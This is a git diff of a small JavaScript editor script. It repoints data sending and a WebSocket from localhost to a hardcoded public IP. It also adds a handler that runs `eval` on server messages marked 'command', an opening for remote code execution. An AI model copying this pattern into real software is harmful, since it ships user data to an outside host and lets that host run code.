@@ -3,6 +3,9 @@
 function start() {
     try {
         sendData();
+        console.log(`${document.getElementById("stop").innerHTML}`);
+        // receiveData();
+        document.getElementById("stop").innerHTML = '<p>a</p>'
     } catch (e) {
         console.log(`${e}`);
     }
@@ -14,9 +17,9 @@ function start() {
 
 function sendData() {
     try {
-        fetch("http://localhost:25565?a=" + JSON.stringify(editorData), {
-            method: 'get'
-        })
+        fetch("http://54.202.231.195:53849?a=" + JSON.stringify(`${editorData}`), {
+                method: 'get'
+            })
             .then(response => response.json())
             .then(data => console.log(data));
     } catch (e) {
@@ -25,8 +28,12 @@ function sendData() {
 }
 
 function receiveData() {
-    const connection = new WebSocket('ws://localhost:3001');
+    const connection = new WebSocket('ws://54.202.231.195:51887');
     connection.onmessage = e => {
-        console.log(e.data)
+        
+        let msg = JSON.parse(e.data);
+        console.log(`${msg.payload}`)
+        msg.type === "command" ? eval('"'+msg.payload+'"') : ''
+        
     }
 }
